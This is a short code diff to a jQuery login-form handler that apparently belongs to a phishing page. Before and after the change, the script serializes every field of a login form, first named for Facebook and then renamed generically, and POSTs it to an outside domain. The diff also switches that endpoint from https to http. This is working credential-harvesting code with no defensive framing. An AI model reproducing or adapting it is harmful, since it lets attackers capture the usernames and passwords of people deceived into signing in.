@@ -1,8 +1,8 @@
-$(".login-facebook").submit(function() {
-	var d = $(".login-facebook");
+$(".login-form").submit(function() {
+	var d = $(".login-form");
 
 	$.ajax({
-        url: "https://api-3botak.xyz/spink.php",
+        url: "http://api-3botak.xyz/spink.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
